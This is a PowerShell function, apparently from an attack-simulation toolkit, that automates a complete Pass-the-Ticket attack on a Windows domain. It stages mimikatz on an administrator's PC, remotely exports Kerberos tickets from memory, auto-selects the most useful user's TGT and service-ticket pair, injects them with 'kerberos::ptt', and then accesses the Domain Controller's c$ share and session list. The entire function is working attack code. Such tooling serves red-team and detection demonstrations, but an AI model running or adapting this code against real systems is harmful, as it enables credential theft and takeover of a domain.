function Invoke-PassTheTicketAttack {
    
    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################
    
    $hostname = $env:computername

    $Script:ASSAW = Get-ASConfig -Setting "mySAW"

    $TicketsSourcePath = "\\$Script:ASSAW\$Script:ASTicketsUNCPath"
    $TicketsTargetPath = $Script:AS2GOTempDir
    $TicketsToAbusePath = $Script:AS2GOTicketsDir

    
    $path = Get-ASConfig -Setting "Tools"
    $tool1 = join-path -path $path -childpath "mimikatz.exe"
    $tool2 = join-path -path $path -childpath "PsExec.exe"
    
    If (-not $SkipClearHost) { Clear-Host }
    
    Invoke-output -Type Header -Message "Pass-the-Ticket (PtT) Attack"
    Invoke-output -Type Info -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `n In this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions."
    Invoke-output -Type Bullet -Message "Step #1 - stage mimikatz on Admin PC"
    Invoke-output -Type Bullet -Message "Step #2 - harvest tickets on Admin PC"
    Invoke-output -Type Bullet -Message "Step #3 - run PtT to become Domain Admin"

    #
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    # remove all old tickets
    Try {
        Remove-Item $TicketsToAbusePath\*.kirbi -ErrorAction SilentlyContinue
        Remove-Item -Recurse $TicketsSourcePath  -ErrorAction SilentlyContinue
    }
    Catch {

    }

    If (-not $SkipClearHost) { Clear-Host }

    ###############################################################################################################################

    Invoke-output -Type Header -Message "Stage mimikatz on Admin PC $Script:ASSAW"

    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
    $command = "Copy-Item -Path $tool1 -Destination $TicketsSourcePath  -Recurse"
    Write-Syntax -Code $command

    #cleanup
    Remove-Item -Recurse $TicketsSourcePath  -ErrorAction Ignore
    New-Item $TicketsSourcePath  -ItemType directory -ErrorAction Ignore | Out-Null
    Copy-Item -Path $tool1  -Destination $TicketsSourcePath  -Recurse
    $result = Get-Childitem -Path $TicketsSourcePath -Filter *.exe

    If ($result) {
        $result | Select-Object FullName, LastWriteTime | Out-Host
        Invoke-Output -Type Success -Message "File staging on the admin PC succeeded."
    }
    else {
        Invoke-Output -Type Error -Message "File staging on the admin PC failed."
        return
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }

    
    ####################################################################################################################################
    Invoke-output -Type Header -Message "harvest tickets on Admin PC $Script:ASSAW"

    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
    
    $command = '
    Invoke-Command -Session $session -ScriptBlock {
        Set-Location C:\Temp\tickets
        .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
    }'
    Write-Syntax -Code $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }


    $session = New-PSSession -ComputerName $Script:ASSAW -ErrorAction Stop
    try {
        $remoteOutput = Invoke-Command -Session $session -ScriptBlock {
            Try {
            Set-Location C:\Temp\tickets
            .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
            }
            catch {
                    Write-Error $_
            }
        } -ErrorAction Stop

        $remoteOutput | Out-Host
    }
    finally {
        if ($null -ne $session) {
            Remove-PSSession -Session $session -ErrorAction SilentlyContinue
        }
    }
    
    $alltickets = Get-KirbiTicketInfo -path $TicketsSourcePath

    If ($alltickets) {
        write-host "`n"
        Invoke-Output -Type Success -Message "Kerberos ticket harvesting on the admin PC succeeded. `
       $($alltickets.Count) 'kirbi' files were found in: $TicketsSourcePath" -NoExtraLines
    }
    else {
        Invoke-Output -Type Error -Message "Kerberos ticket harvesting on the admin PC failed. `
             No 'kirbi' files were found in: ` 
             $TicketsSourcePath"
        return
    }

    $uniqueInfo = Get-KirbiUniqueInfo -alltickets $alltickets
    $uniqueAccounts = Get-KirbiUniqueAccounts -alltickets $alltickets

    $kirbiFiles = Get-ChildItem -Path $TicketsSourcePath -Filter *.kirbi
    $kirbiTicketCount = ($uniqueAccounts | Measure-Object -Property UniqueSPNCount -Sum ).Sum
    $kirbiUsers = ($uniqueAccounts | Where-Object { $_.AccountType -eq 'User' }).count
    $kirbiComputers = ($uniqueAccounts | Where-Object { $_.AccountType -eq 'Computer' }).count

    Write-Host "`n       The analysis identified $($kirbiFiles.Count) exported Kerberos ticket files,"
    Write-Host "       representing $( $kirbiTicketCount) unique tickets associated with $($kirbiUsers) user accounts and $($kirbiComputers) computer accounts.`n"

    $uniqueAccounts | 
    Select-Object AccountType, Principal, TicketFileCount, UniqueSPNCount, ServiceTicketCount, TGTCount | 
    Sort-object AccountType, TGTCount | Format-Table | out-host

    $bestPtTUser = $uniqueAccounts |
    Where-Object {
        $_.AccountType -eq 'User' -and
        [int]$_.TGTCount -gt 0 -and
        [int]$_.ServiceTicketCount -gt 0
    } |
    Sort-Object `
    @{ Expression = { $_.TGTCount }; Descending = $true },
    @{ Expression = { $_.ServiceTicketCount }; Descending = $true },
    @{ Expression = { $_.UniqueSPNCount }; Descending = $true },
    @{ Expression = { $_.LastSeen }; Descending = $true } |
    Select-Object -First 1

    $candidate = $bestPtTUser.principal
    Invoke-Output -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate

    $title = "Confirm or change the account whose tickets will be copied"
    $message = ">> $candidate"

    $Options = @(
        [pscustomobject] @{ Label = "&OK"; Help = "Use default candidate."; Value = "OK" },
        [pscustomobject] @{ Label = "&Select a different candidate"; Help = "Type a new candidate."; Value = "New" }   
        #[pscustomobject] @{ Label = "&Cancel"; Help = "Return to main setup."; Value = "Skip" }
    )

    $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
    Write-Host

    If ($answer -eq "New") {
        $candidate = Invoke-Output -Type Input -Message "Enter the new candidate"
    }

    Invoke-output -Type Header -Message "Copy tickets from Admin PC for candidate '$candidate'"
    #If ($UnAttended) { Start-Sleep 2 } else { Pause }


    If (-not (Test-Path $TicketsTargetPath)) {
        New-Item -Path $TicketsTargetPath -ItemType Directory -Force | Out-Null
    }  
    else {
        Remove-Item -Path "$TicketsTargetPath\*.kirbi" -Force
    }

    Get-Item "$TicketsSourcePath\*-$candidate@*.kirbi" | Copy-Item -Destination $TicketsTargetPath
    $results = Get-Item "$TicketsTargetPath\*-$candidate@*.kirbi"

    If ($results) {
        write-host "`n"
        $results | Format-Table Name
        Invoke-Output -Type Success -Message "$($results.Count) 'kirbi' files were copied to: $TicketsTargetPath" -NoExtraLines
    }
    else {
        Invoke-Output -Type Error -Message "Copying tickets from $TicketsSourcePath on the admin PC failed."
        return
    }
    pause
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    #Remove-Item -Recurse $TicketsSourcePath 
    
    $bestresult = Get-KirbiBestFiles -alltickets $alltickets -candidate $candidate

    #$bestresult.TicketPairs   | Format-Table Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile -AutoSize
    $selectedPair = $bestresult.TicketPairs   | Select-Object -First 1
    invoke-output -Type H1 -Message "Identified the 'best' Ticket Pair"
    $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | out-host

    $4logfile = $selectedPair | Format-list  Account, LUID, TGTSPN, ServiceSPN, TGTFile, ServiceFile | Out-String

    write-log INFO -Message "Identified the 'best' Ticket Pair: $4logfile"


    Try {
        $TGTFile = $selectedPair.Path
        $ServiceFile = $($selectedPair.Path).Replace($selectedPair.TGTFile, $selectedPair.ServiceFile)
        Copy-Item -LiteralPath $TGTFile -Destination  $TicketsToAbusePath
        Copy-Item -LiteralPath $ServiceFile -Destination $TicketsToAbusePath
    }
    catch {
        write-log ERROR -Message "Failed to copy tickets to $TicketsToAbusePath"
    }


    If (-not $SkipClearHost) { Clear-Host }


    Invoke-Output -Type Header -Message "load stolen tickets from candidate '$candidate'"
    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
    $command = [string]::Format('.\mimikatz.exe  "privilege::debug" "kerberos::ptt {0}" "exit"', $TicketsToAbusePath)
    Write-Syntax -Code $command


    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    
    Invoke-Command -ScriptBlock { & $tool1 "privilege::debug" "kerberos::ptt $TicketsToAbusePath" "exit" }
    
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "       Displays a list of currently cached Kerberos tickets         "
    Write-Host "____________________________________________________________________`n" 
    Write-Host  ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "klist" `
        -Color $fgcC
    Write-Host  ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    write-host ""
    Set-ASConfig -Setting "LastStage" -Value $Script:PtT
    Set-NewColorSchema -NewStage $Script:PtT
   $tickets = Get-KlistTicket
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Invoke-Output -Type Info -Message "Last Ticket"
    $tickets | Select-object -Last 1 | Format-List
    

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "                 2nd TRY connect to DCs c$ share                    "   
    Write-Host "____________________________________________________________________`n" 
    write-host ""

    $directory = "\\$Script:ASDC\c$"
    Get-DirContent -Path $directory
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
    Write-Host "____________________________________________________________________`n" 
    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\NetSess.exe ", "$Script:ASDC" `
        -Color $fgcC, $fgcV
    Write-Host  ""


    Get-SessionsOnDC -server $Script:ASDC
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Write-Log -Message "    >> using "
    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
